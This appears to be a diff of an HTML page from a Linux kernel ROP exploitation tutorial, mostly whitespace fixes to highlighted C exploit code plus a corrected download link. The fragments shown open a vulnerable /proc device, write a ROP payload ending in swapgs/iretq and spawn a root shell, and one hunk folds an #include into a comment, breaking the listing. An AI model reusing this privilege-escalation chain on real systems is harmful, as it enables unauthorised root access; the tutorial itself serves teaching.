@@ -14,7 +14,7 @@
         <br><br>
         I am going to start by covering the environment setup and the previously mentioned mitigations before diving into the actual exploit development process. I would recommend a strong familiarity with usermode exploit development before diving into kernel exploitation.
         <br><br>
-        You can find all relevant files to setup the environment and develop your exploit here: <a href=https://github.com/seal9055/Docs/kernel/kernel_rop.tar.gz>kernel_rop.tar.gz</a>
+        You can find all relevant files to setup the environment and develop your exploit here: <a href=https://github.com/seal9055/seal9055.github.io/tree/main/docs/kernel/kernel_rop.tar.gz>kernel_rop.tar.gz</a>
         <br>
     </p>
 </div>
@@ -153,8 +153,7 @@
 <div>
     <img src="../imgs/kernel/rop_kernel/root_proof.png" alt="">
 </div>
-<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;stdio.h&gt;</span><span style="color: #d33682"></span>
-<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/types.h&gt;</span><span style="color: #d33682"></span>
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;stdio.h&gt;</span><span style="color: #586e75; font-style: italic"> #include &lt;sys/types.h&gt;</span><span style="color: #d33682"></span>
 <span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/stat.h&gt;</span><span style="color: #d33682"></span>
 <span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;fcntl.h&gt;</span><span style="color: #d33682"></span>
 <span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sched.h&gt;</span><span style="color: #d33682"></span>
@@ -185,7 +184,7 @@
 
 <span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">open_proc</span><span style="color: #839496">()</span>
 <span style="color: #839496">{</span>
-<span style="color: #839496">    fd </span><span style="color: #586e75">=</span><span style="color: #839496"> open(</span><span style="color: #2aa198">"/proc/pwn_device"</span><span style="color: #839496">, O_RDWR);</span>
+<span style="color: #839496">   fd </span><span style="color: #586e75">=</span><span style="color: #839496"> open(</span><span style="color: #2aa198">"/proc/pwn_device"</span><span style="color: #839496">, O_RDWR);</span>
 <span style="color: #839496">   </span><span style="color: #859900">if</span><span style="color: #839496"> (fd </span><span style="color: #586e75">&lt;</span><span style="color: #839496"> </span><span style="color: #2aa198">0</span><span style="color: #839496">){</span>
 <span style="color: #839496">       puts(</span><span style="color: #2aa198">"[!] Failed to open device"</span><span style="color: #839496">);</span>
 <span style="color: #839496">       exit(</span><span style="color: #2aa198">-1</span><span style="color: #839496">);</span>
@@ -210,14 +209,14 @@
 
 <span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">get_shell</span><span style="color: #839496">(</span><span style="color: #b58900">void</span><span style="color: #839496">)</span>
 <span style="color: #839496">{</span>
-<span style="color: #839496">    puts(</span><span style="color: #2aa198">"[+] Returned to userland"</span><span style="color: #839496">);</span>
-<span style="color: #839496">    </span><span style="color: #859900">if</span><span style="color: #839496"> (getuid() </span><span style="color: #586e75">==</span><span style="color: #839496"> </span><span style="color: #2aa198">0</span><span style="color: #839496">) {</span>
-<span style="color: #839496">        printf(</span><span style="color: #2aa198">"[+] UID: %d, got root!\n"</span><span style="color: #839496">, getuid());</span>
-<span style="color: #839496">        system(</span><span style="color: #2aa198">"/bin/sh"</span><span style="color: #839496">);</span>
-<span style="color: #839496">    } </span><span style="color: #859900">else</span><span style="color: #839496"> {</span>
-<span style="color: #839496">        printf(</span><span style="color: #2aa198">"[!] UID: %d, didn't get root\n"</span><span style="color: #839496">, getuid());</span>
-<span style="color: #839496">        exit(</span><span style="color: #2aa198">-1</span><span style="color: #839496">);</span>
-<span style="color: #839496">    }</span>
+<span style="color: #839496">   puts(</span><span style="color: #2aa198">"[+] Returned to userland"</span><span style="color: #839496">);</span>
+<span style="color: #839496">   </span><span style="color: #859900">if</span><span style="color: #839496"> (getuid() </span><span style="color: #586e75">==</span><span style="color: #839496"> </span><span style="color: #2aa198">0</span><span style="color: #839496">) {</span>
+<span style="color: #839496">       printf(</span><span style="color: #2aa198">"[+] UID: %d, got root!\n"</span><span style="color: #839496">, getuid());</span>
+<span style="color: #839496">       system(</span><span style="color: #2aa198">"/bin/sh"</span><span style="color: #839496">);</span>
+<span style="color: #839496">   } </span><span style="color: #859900">else</span><span style="color: #839496"> {</span>
+<span style="color: #839496">       printf(</span><span style="color: #2aa198">"[!] UID: %d, didn't get root\n"</span><span style="color: #839496">, getuid());</span>
+<span style="color: #839496">       exit(</span><span style="color: #2aa198">-1</span><span style="color: #839496">);</span>
+<span style="color: #839496">   }</span>
 <span style="color: #839496">}</span>
 <span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> user_rip </span><span style="color: #586e75">=</span><span style="color: #839496"> (</span><span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496">)get_shell;</span>
 
@@ -238,10 +237,10 @@
 <span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">swapgs;</span>
 <span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">iretq;</span>
 <span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_rip;</span>
-<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_cs;</span>
-<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_rflags;</span>
-<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_sp;</span>
-<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_ss;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_cs;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_rflags;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_sp;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_ss;</span>
 <span style="color: #839496">   </span>
 <span style="color: #839496">   puts(</span><span style="color: #2aa198">"[+] Sending payload"</span><span style="color: #839496">);</span>
 <span style="color: #839496">   write(fd, payload, </span><span style="color: #859900">sizeof</span><span style="color: #839496">(payload));</span>
